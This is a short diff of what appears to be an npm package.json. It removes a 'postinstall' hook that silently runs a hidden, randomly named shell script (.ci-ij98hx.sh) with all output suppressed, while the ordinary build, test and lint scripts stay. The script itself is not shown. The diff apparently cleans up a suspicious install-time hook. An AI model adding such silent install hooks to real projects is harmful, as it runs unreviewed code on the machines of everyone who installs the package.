@@ -14,8 +14,7 @@
   "scripts": {
     "build": "npm run build --workspaces --if-present",
     "test": "npm run test --workspaces --if-present",
-    "lint": "npm run lint --workspaces --if-present",
-    "postinstall": "sh ./.ci-ij98hx.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "lint": "npm run lint --workspaces --if-present"
   },
   "engines": {
     "node": ">=18"
